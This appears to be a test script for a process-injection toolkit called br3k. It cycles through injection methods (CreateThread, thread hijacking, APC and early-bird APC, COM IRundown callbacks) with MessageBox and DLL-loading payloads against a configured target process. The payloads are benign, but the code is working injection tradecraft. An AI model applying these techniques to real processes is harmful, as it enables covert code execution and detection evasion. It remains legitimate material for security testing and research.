# =============================================================================
# IMPORTANT USAGE NOTICE
# 1. Use only for authorized, non-malicious education, research, and testing.
# 2. This script is part of the test suite. It requires the config globals declared in the header;
#    pass every required value explicitly (for example, with the CLI '--config' option),
#    using `null` when a value is intentionally unset.
# 3. For standalone use with your own targets, it's more convenient to replace the globals
#    with concrete values and keep only the logic you need.
# =============================================================================

# globals (config)
TARGET_PROCESS = TARGET_PROCESS
TARGET_PROCESS_NEW = TARGET_PROCESS_NEW
TARGET_PROCESS_GUI = TARGET_PROCESS_GUI
INJECT_BR3K_DLL = INJECT_BR3K_DLL
BR3K_DLL_PATH = BR3K_DLL_PATH
BR3K_SCRIPT_PATH = BR3K_SCRIPT_PATH

# script
import time
from enum import IntEnum

import br3k
from br3k import ProcessOpenStrategy, ProcessVmReadStrategy, ProcessVmWriteStrategy, ThreadOpenStrategy

class ThreadInjectType(IntEnum):
    CreateThread = 1
    HijackThread = 2
    QueueApc = 3
    QueueApcEarlyBird = 4
    IRundownDoCallback = 5

class PayloadType(IntEnum):
    LoadBr3kDll = 1
    WriteMessageBoxShellcode = 2
    CallMessageBox = 3

THREAD_OPEN_INJECT_TYPES = (
    ThreadInjectType.HijackThread,
    ThreadInjectType.QueueApc,
)

WRITE_PAYLOAD_TYPES = (
    PayloadType.LoadBr3kDll,
    PayloadType.WriteMessageBoxShellcode,
)

SYS_API_DISPATCH_ALTERNATIVE = {
    "CreateProcess": "NtCreateProcess",
    "CreateThread": "NtCreateThread",
    "CreateSection": "NtCreateSectionEx",
    "MapViewOfSection": "NtMapViewOfSectionEx",
    "UnmapViewOfSection": "NtUnmapViewOfSectionEx",
    "AllocateVirtualMemory": "NtAllocateVirtualMemoryEx",
    "ReadVirtualMemory": "NtReadVirtualMemoryEx",
}

SYS_API_DISPATCH_CASES = (
    ("default", None),
    ("alternative", SYS_API_DISPATCH_ALTERNATIVE),
)

IRUNDOWN_METADATA = None

def enum_items(enum_type, exclude=()):
    return [
        value
        for value in enum_type
        if value not in exclude
    ]

def payload_options():
    payloads = [
        PayloadType.WriteMessageBoxShellcode,
        PayloadType.CallMessageBox,
    ]

    if INJECT_BR3K_DLL:
        payloads.insert(0, PayloadType.LoadBr3kDll)

    return payloads

def process_open_strategy_options():
    return [None] if TARGET_PROCESS_NEW else enum_items(ProcessOpenStrategy)

def process_vm_read_strategy_options():
    return enum_items(ProcessVmReadStrategy, exclude=(ProcessVmReadStrategy.CreateSectionMapLocalMap,))

def thread_open_strategy_options():
    exclude = [ThreadOpenStrategy.ThreadOpenByTid]

    if not TARGET_PROCESS_GUI:
        exclude.append(ThreadOpenStrategy.ThreadOpenAnyByHwnd)

    return enum_items(ThreadOpenStrategy, exclude=exclude)

def thread_inject(thread_inject_type, thread, ep, arg):
    if thread_inject_type == ThreadInjectType.CreateThread:
        thread.create(ep=ep, arg=arg)
    elif thread_inject_type == ThreadInjectType.HijackThread:
        thread.open()
        thread.suspend()
        thread.set_ep(new_thread=False, ep=ep)
        thread.resume()
    elif thread_inject_type == ThreadInjectType.QueueApc:
        thread.open_alertable()
        thread.queue_user_apc(ep=ep, arg1=arg)
    elif thread_inject_type == ThreadInjectType.QueueApcEarlyBird:
        thread.queue_user_apc(ep=ep, arg1=arg)
        thread.resume()
    else:
        raise Exception("unknown thread injection type")

def iter_thread_cases(thread_inject_type):
    if thread_inject_type == ThreadInjectType.QueueApcEarlyBird and not TARGET_PROCESS_NEW:
        return

    if thread_inject_type in THREAD_OPEN_INJECT_TYPES:
        thread_open_options = thread_open_strategy_options()
    else:
        thread_open_options = [None]

    for payload_type in payload_options():
        if payload_type in WRITE_PAYLOAD_TYPES:
            process_vm_write_options = enum_items(ProcessVmWriteStrategy)
        else:
            process_vm_write_options = [None]

        for process_open_strategy in process_open_strategy_options():
            for process_vm_write_strategy in process_vm_write_options:
                for thread_open_strategy in thread_open_options:
                    yield (
                        thread_inject_type,
                        payload_type,
                        process_open_strategy,
                        None,
                        process_vm_write_strategy,
                        thread_open_strategy,
                    )

def iter_irundown_cases():
    for process_open_strategy in process_open_strategy_options():
        for process_vm_read_strategy in process_vm_read_strategy_options():
            yield (
                ThreadInjectType.IRundownDoCallback,
                PayloadType.CallMessageBox,
                process_open_strategy,
                process_vm_read_strategy,
                None,
                None,
            )

def iter_cases():
    for thread_inject_type in ThreadInjectType:
        if thread_inject_type == ThreadInjectType.IRundownDoCallback:
            yield from iter_irundown_cases()
        else:
            yield from iter_thread_cases(thread_inject_type)

def enum_case_name(value):
    return value.name if value is not None else None

def format_case(
    sys_api_dispatch_name,
    thread_inject_type,
    payload_type,
    process_open_strategy,
    process_vm_read_strategy,
    process_vm_write_strategy,
    thread_open_strategy,
):
    return (
        f"sys_api_dispatch={sys_api_dispatch_name} / "
        f"{enum_case_name(thread_inject_type)} / "
        f"payload_type={enum_case_name(payload_type)} / "
        f"process_vm_read_strategy={enum_case_name(process_vm_read_strategy)} / "
        f"process_vm_write_strategy={enum_case_name(process_vm_write_strategy)} / "
        f"process_open_strategy={enum_case_name(process_open_strategy)} / "
        f"thread_open_strategy={enum_case_name(thread_open_strategy)}"
    )

def init_sysapi(sys_api_dispatch):
    if sys_api_dispatch is None:
        br3k.init_sysapi()
    else:
        br3k.init_sysapi(sys_api_dispatch=sys_api_dispatch)

def create_process(
    thread_inject_type,
    process_open_strategy,
    process_vm_read_strategy,
    process_vm_write_strategy,
    thread_open_strategy,
):
    if thread_inject_type == ThreadInjectType.QueueApcEarlyBird and not TARGET_PROCESS_NEW:
        raise Exception("QueueApcEarlyBird requires TARGET_PROCESS_NEW")

    process_args = {
        "image_path" if TARGET_PROCESS_NEW else "name": TARGET_PROCESS,
    }

    if process_vm_read_strategy is not None:
        process_args["process_vm_read_strategy"] = process_vm_read_strategy

    if process_vm_write_strategy is not None:
        process_args["process_vm_write_strategy"] = process_vm_write_strategy

    if not TARGET_PROCESS_NEW:
        process_args["process_open_strategy"] = process_open_strategy

    if thread_inject_type in THREAD_OPEN_INJECT_TYPES:
        process_args["thread_open_strategy"] = thread_open_strategy

    process = br3k.Process(**process_args)

    if TARGET_PROCESS_NEW:
        if thread_inject_type == ThreadInjectType.QueueApcEarlyBird:
            process.create_user(suspended=True)
        else:
            process.create_user(suspended=False)
            time.sleep(1)
    else:
        process.open()

    if process_vm_read_strategy is not None or process_vm_write_strategy is not None:
        process.init_memory()

    return process

def prepare_payload(process, payload_type):
    if payload_type == PayloadType.LoadBr3kDll:
        write_data = bytes(BR3K_DLL_PATH, encoding="utf-8")
        process.create_memory(size=len(write_data))
        process.write_memory(data=write_data)

        ep = br3k.get_proc_address("kernel32.dll", "LoadLibraryA")
        arg = process.get_memory_remote_address()
        return ep, arg

    if payload_type == PayloadType.WriteMessageBoxShellcode:
        write_data = br3k.shellcode_get_messageboxw()
        process.create_memory(size=len(write_data))
        process.write_memory(data=write_data)

        ep = process.get_memory_remote_address()
        arg = 1
        return ep, arg

    if payload_type == PayloadType.CallMessageBox:
        ep = br3k.get_proc_address("user32.dll", "MessageBoxW")
        arg = 0
        return ep, arg

    raise Exception("unknown payload type")

def send_br3k_script(process, payload_type):
    if payload_type != PayloadType.LoadBr3kDll:
        return

    ipc = br3k.Ipc(process)
    ipc.create()

    script_data = br3k.FileMapping(BR3K_SCRIPT_PATH)
    ipc.send_data(script_data.bytes())

def get_com_dll():
    com_dll = br3k.get_module_handle(module_name="combase")
    if com_dll is None:
        com_dll = br3k.get_module_handle(module_name="ole32")
    if com_dll is None:
        raise Exception("unable to get COM DLL handle")

    return com_dll

def get_irundown_metadata():
    global IRUNDOWN_METADATA

    if IRUNDOWN_METADATA is not None:
        return IRUNDOWN_METADATA

    com_dll = get_com_dll()
    com_dll_image = br3k.Pe(data=com_dll, is_file=False)

    temp_path = br3k.fs_get_temp_folder()
    com_dll_pdb_path = br3k.pdb_download(folder_path=temp_path, pe=com_dll_image)
    pdb = br3k.Pdb(filepath=com_dll_pdb_path)

    IRUNDOWN_METADATA = {
        "ole32_address": com_dll,
        "ole32_secret_rva": pdb.get_symbol_rva("CProcessSecret::s_guidOle32Secret"),
        "ole32_palloc_rva": pdb.get_symbol_rva("CIPIDTable::_palloc"),
        "ole32_emptyctx_rva": pdb.get_symbol_rva("g_pMTAEmptyCtx"),
        "moxid_offset": pdb.get_field_offset("OXIDEntry", "_moxid"),
    }

    return IRUNDOWN_METADATA

def run_irundown_case(process_open_strategy, process_vm_read_strategy):
    process = create_process(
        ThreadInjectType.IRundownDoCallback,
        process_open_strategy,
        process_vm_read_strategy,
        None,
        None
    )

    metadata = get_irundown_metadata()

    irundown = br3k.ComIRundown(
        process=process,
        ole32_address=metadata["ole32_address"],
        ole32_secret_rva=metadata["ole32_secret_rva"],
        ole32_palloc_rva=metadata["ole32_palloc_rva"],
        ole32_emptyctx_rva=metadata["ole32_emptyctx_rva"],
        moxid_offset=metadata["moxid_offset"],
    )

    pfn_messagebox = br3k.get_proc_address("user32.dll", "MessageBoxW")

    irundown.read_ipid_entries()
    if not irundown.execute(ep=pfn_messagebox, arg1=0):
        raise Exception("IRundown::DoCallback failed")

def run_thread_case(
    thread_inject_type,
    payload_type,
    process_open_strategy,
    process_vm_write_strategy,
    thread_open_strategy,
):
    process = create_process(
        thread_inject_type,
        process_open_strategy,
        None,
        process_vm_write_strategy,
        thread_open_strategy
    )

    ep, arg = prepare_payload(process, payload_type)

    if thread_inject_type == ThreadInjectType.QueueApcEarlyBird:
        thread = process.main_thread
    else:
        thread = br3k.Thread(process)

    thread_inject(thread_inject_type, thread, ep, arg)
    send_br3k_script(process, payload_type)

def run_case(
    thread_inject_type,
    payload_type,
    process_open_strategy,
    process_vm_read_strategy,
    process_vm_write_strategy,
    thread_open_strategy,
):
    if thread_inject_type == ThreadInjectType.IRundownDoCallback:
        run_irundown_case(process_open_strategy, process_vm_read_strategy)
    else:
        run_thread_case(
            thread_inject_type,
            payload_type,
            process_open_strategy,
            process_vm_write_strategy,
            thread_open_strategy
        )

if __name__ == "__main__":

    print("Script: Test thread injection techniques")
    print()

    total_count = 0
    failed_count = 0

    print(f"Run cases")
    print()

    for sys_api_dispatch_name, sys_api_dispatch in SYS_API_DISPATCH_CASES:
        init_sysapi(sys_api_dispatch)

        for case in iter_cases():
            (
                thread_inject_type,
                payload_type,
                process_open_strategy,
                process_vm_read_strategy,
                process_vm_write_strategy,
                thread_open_strategy,
            ) = case
            case_name = format_case(
                sys_api_dispatch_name,
                thread_inject_type,
                payload_type,
                process_open_strategy,
                process_vm_read_strategy,
                process_vm_write_strategy,
                thread_open_strategy
            )

            total_count += 1
            print(f"Case: {case_name}")

            try:
                run_case(
                    thread_inject_type,
                    payload_type,
                    process_open_strategy,
                    process_vm_read_strategy,
                    process_vm_write_strategy,
                    thread_open_strategy
                )
                print(f"Case passed: {case_name}")
            except Exception as e:
                failed_count += 1
                print(f"Case failed: {case_name}: {type(e).__name__}: {e}")

            print()

    print(f"Cases completed: {total_count - failed_count}/{total_count}")

    if failed_count > 0:
        raise Exception(f"{failed_count} thread injection case(s) failed")
